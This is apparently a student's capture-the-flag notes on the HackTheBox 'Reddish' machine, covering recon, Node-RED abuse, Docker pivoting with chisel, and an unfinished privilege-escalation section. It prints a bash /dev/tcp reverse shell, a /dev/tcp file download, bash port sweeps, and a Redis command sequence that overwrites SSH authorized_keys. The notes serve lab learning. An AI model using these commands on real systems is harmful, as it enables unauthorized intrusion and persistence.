# Reddish

Name: Reddish
Date:  24/08/2022 - 29/3/2023
Difficulty:  Insane
Goals:  
To practice:
- Different ways pivot, how to, the limitation, risks
- Linux related machines not done one recently 
- Database hacking
- Be handheld through an insane machine to know how far I many connections in my brain I have to go - roughly scaled between scarily alot and ton
	- Reasoning comes from being good guitar. Sometime you just to sit there and be wowed and try anyway, clumsy try, find the parts that are difficult and find similarly easiler elements elsewhere, [More Rocky](https://www.youtube.com/watch?v=hHpFSQMUxj4), [More Cheesey](https://www.youtube.com/watch?v=yGZsnbPCv1I) or [More British](https://www.youtube.com/watch?v=pt-Yc2rzOOM) or more [Bass](https://www.youtube.com/watch?v=Sa0upTDZDYQ) or [Spanish](https://www.youtube.com/watch?v=NIKWBdthzg4) - combine all of that and keep building
Learnt:
1. I need to try switching more Web Requests
2. TCP reply not listen back on shell...
3. cat file transfer
4. Wonders/Horrors /dev/shm directory
5. Manual (Heard but not tried till now) Go Programs by using ldflags and upx packing from 10Mb to 3Mb!
6. Power of chisel only.
7. Excalidraw is time consuming compare to pen and paper but looks good, I guess I'll add a drawing pad to eventually one day shop list 
8. Favicons were a large part of 
Beyond Root:
- Omni-Tool-Usage for port redirection - but demostrate with Ubuntu server for tools cannot just install onto the box 
- Clarity over all possible options 
- Revamp my Port-Redirection article(s), Chisel

Returning to this box as I left it in a incomplete state while taking so much information away in 2022. As of 2023 I need a primer on a large potential part of OSCP, virtual and physical networking for AZ. Given this is the forth time returning to this box and the fifth time following along, I must note that I learnt so much and I am here to finish this as helped-through andmake sure port-redirection is engrained in my brain forever. I used and will use again [Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM), [0xDF write up](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html), [0xDF Tunneling and Pivoting](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html) and [0xDF using chisel with SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

As a general note to any unsuspecting readers, this a continuation of trying and so it contains me attempt to figure out were my recon is well tuned and not, but therefore there are also tangents including later additions of trying to figure out by comparison what I not doing correctly or efficiently. In hindsight and the most unhelpful statement to less experienced is that CTF are meant to be solved the pieces exist on the box to solve them, but also rabbit holes that will lead you astray, which is both something you have to learn to live and learn to overcome. There is a very steep learning curve with hacking and CTFs ramp upin a unrealistic way to taeach you a skill of avoiding the rabbit hole, but also the finding the alogorically thread and pull on it, but also collecting all the threads and the "purpose" of the machine. The latter being a SysAdmin it is easy to know that server X does Y function for a business, but when you are doing CTFs it was hard doing these alone without some these obvious to other concepts just apparent. 


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Reddish/Screenshots/ping.png)

#### Note to self...

I want to note some of the differences to mine and Ippsec's more efficient Recon, although its is a scripted video it is still someone else approach to Web Hacking to assimilate to my own. Firstly Icons favicons, in the Haddix Bug Bounty Hunter Methodology and on serveral podcasts Haddix mentions a friend whom had a expertise in favicon abuse. 

Unknown Application?
- Download the Favicon and reverse image search

#### Return to WTF is this

A reason to use google more than other is search engines with great seach scope can help you identify the RedNode Application. I feroxbuster and then tried the /red/about directory and got this post request :
This is such a weird request to me. We get back HTTP/2 of all things.

![1080](weirdtokenrequest.png)

To get the About.html, grepping for `red`
![](greppingtheabout.png)`

Reveal node-red...

I still think the favicon is cooler, but I a happy that I am improving my searching or dorking ability somewhat as I have be worrying I am too meticulious or no where near enough to get anywhere. **BUT** I would have notice the key, but not found it.. I know 
![posting](ippsecposts.png)
Day 1 : `ab68fb463e681b499d99226ce92e12e9`
Day 2: returned it generate a new `b1a51218f30da47d4f45b52972804d1a`
Day 3: After along time away: `695613754dfef3f53a0b18b02d805047`
Day 4: After some practice elsewhere
Day 5: `c811816e50d58bd34204067b8ba3ae80`

As of Day 5; I have learn so much as to why my approaches were good
1. Manual combing the with burp site and asking questions is really good
1. Given time limits I was and set myself to try to expand my experience of different possiblities of problem, rushing and missing the key seems so silly, but indicative of me stress testing to push my brain to make me care a  great deal about hacking and solving boxes 
	- Neurologically very important
1. I answer the question of what content is accessible with feroxbuster 
and not as well rounded:
1. I found that the best way to track myself and will for changing request types was curl
	1.  Although Ippsec is very good there are somethings that reveal to me through hacking that some there are much much better ways to keep notes and tools for the job for cyclic enumeration and exploitation 
		1. Watching some of the top HTB hackers you realise that they all do one thing that Ippsec video do not teach: really simple stuff first and they show it. XCT remind you that tooling is important, but if you brain knows just grep it that is something more time-savingly awesome and the really key to how people like xct get first bloods. They do really simple stuff to get answer that everyone else who is still learning the technology and tools miss both learning.

`curl -X` is so much more time friendly and note-keeping friendly, than burp, but you need to manually feel out the site. Keeping track each request obscured by the GUI. Maybe burp pro irons this into something really usable, but intutively that just seems excess layering and expensive. 
![](metametathereruncurlisgood.png)

[Node-RED](https://nodered.org/about/) is a program tools visually displaying and interactable function of a program in chart.

![](no-exploits.png)

This section was a real hammered  home of the, how can I achieve my objective with what is in front of me. I think I have been concern about learning about and I will endeavour to try more boxes like this or to make VMs with this level of interactability, I remember there is some proving ground boxes that are more like this. This box is possibly one of the best boxes I have ever spent time on. I have spent alot on this box just learning.

## Exploit

Application?
- What can you do with it to CRUD the filesystem, network, etc?
- Can you replicate it 

![nodered](NODE-red.png)

TCP reply to! This is misconfiguration vulnerablity as we are affectively RCE the box with pretty much unlimited functionality through the hosting of this service using the host server. From DoSing, using it a proxy or tunnel, http server, C2 or email (it has social media and email functionality) or run javascript to mine cryptocurrency on the server owners electricity bill would be eye watering.

![shell](shell.png)

`bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'`

Even though I like ncat and netcat, I am glad to finally be prompted to use it as a file transfer mechanism instead of other tools. Similar to trying out powercat it felt fun, but also gratting a tad as I always see it on Enumeration Script scans after I run it.. but I don't check its there before file transfering.

![](noexecshm.png)


WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets!
```bash
bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
```

LinEnum finds Docker
![docker](weareindocker.png)

## Docker Foothold

Or you could manually checked the root directory for dot files and observed the `.dockerenv`, the above check for Docker contain is in the `/proc/1/cgroup`.
![](alwayslslainroot.png)

Although it is not mentioned a good thing to then check with Docker would be IP address as it is may have its own routing configuration to the host box.
![docker](dockerips.png)
Ping sweeping appears in both RedTeamFieldMnaula and Netmux operator handbook.
```bash
for ip in $(seq 1 5); do
	ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"
done
```

Oneliner versions
`for ip in $(seq 1 5); do ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"; done`
`for ip in $(seq 1 5); do ping -c 1 172.19.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"; done`

![](pingsweepresult.png)

Basic Port scanning 

```
for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.19.0.3/$port && echo "open - $port") 2> /dev/null; done

for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.18.0.1/$port && echo "open - $port") 2> /dev/null; done
```

![1000](port80on3.png)

```bash
# Remember if you compile for another system
# On target machine:
ldd --version # linux and windows
CGO_ENABLED=0 go build -ldflags="-s -w" # For static without c runtime libraries
# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation 
upx chisel
# Setup proxychains and chisel
./chisel server -p 8888 --reverse
# curl chisel run client 
curl http://10.10.14.109/chisel -o chisel
./chisel client 10.10.14.109:8888 R:socks
proxychains nmap -sT -F 
```
mout
You could also do the same with the telling the entire subnet that nmap is being used with [naabu](https://github.com/projectdiscovery/naabu)  `-proxy string`  with socks5 proxy `(ip[:port] / fqdn[:port])`

After researching and making go compilation and doing some of [[Hololive-Writeup]]. With shell stability in mind after returning to this machine for the third time, although I will do it this way just for my own peace on mind after, I want recall proxychaining and using chisel to the port forward to scan the subset with nmap. If we had NC we could do port scanning like this: `nc -zv 172.18.0.1 1-65535`. One thing to consider is that the noexec flag has been set on /dev/shm 

![](noexeconshm.png)

[/dev/shm is a common directory for marshalling and operating from in Linux for attackers as it directory that is a tempory file storage that uses RAM for the backing store](https://superuser.com/questions/45342/when-should-i-use-dev-shm-and-when-should-i-use-tmp. It is flushed leaving no trace of execution or what was put in that directory. It is also faster as than disk storage. For hardening
```bash
sudo mount -o remount,noexec /dev/shm
mount | grep shm # to check flags
```

Burpsuite socks proxy
![](proxyburpproxyception.png)

![](reddishwebpage.png)

Ippsec points out a security risk being that if listening on 0.0.0.0 then is directly accessible by anyone. One thing not pointed out by either Ippsec or 0xDF is that with nikto scan it find a info.php page containing alots of information as it is phpinfo(). Most importantly: `Linux www 4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018 x86_64`

```go
chisel client 10.10.10.10:8000 R:127.0.0.1:8001:172.19.0.3:80
// The server also create Fingerprints 
```

![](webpagefunction.png)
Some checks urls
![](forbiddencodedfolder.png)
![](hits.png)

Ippsec provides justification based on the details in the code that there is database. Therefore on the network interface IP could be docker containers, database and the `http://172.19.0.3/` being the webserver. 

`for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.19.0.2/$port && echo "open - $port") 2> /dev/null; done`

![1000](portscan-2.png)


![](redisrce.png)
I am sure I have done this Redis RCE on THM, but I want to read to hammer the RESEARCH button in my brain. Also to count issue in problem solving and desktop space, the beginning on noted diagrams, less ascii art. Introducing [Excalidraw for Obsidian](https://github.com/zsviczian/obsidian-excalidraw-plugin). 

![](Reddish-Unfinished)


![](bamsearchsploit.png)
Before reading the exploitation of Redis without metasploit. Tunnelling to get to that Redis database is 

![](excellent.png)

[Reading](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html) this database RCE involves write file to the file system by putting out file into Redis server memory and then transfering it.
```bash
$ redis-cli -h 192.168.1.11 flushall
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
# Looks good. How to dump our memory content into the authorized_keys file? 
# That’skinda trivial.
$ redis-cli -h 192.168.1.11192.168.1.11:6379> config set dir /Users/antirez/.ssh/OK192.168.1.11:6379> config get dir
1) "dir"
2) "/Users/antirez/.ssh"192.168.1.11:6379> config set dbfilename "authorized_keys" 
OK
192.168.1.11:6379> save
OK
```

There is also [https://github.com/Ridter/redis-rce/blob/master/redis-rce.py](https://github.com/Ridter/redis-rce/blob/master/redis-rce.py) creates a server to interact with the redis database.  

https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#pivoting

## PrivEsc

      
## Beyond Root

https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
- sshuttle
- ssh
- Chisel
- meterpreter portfwd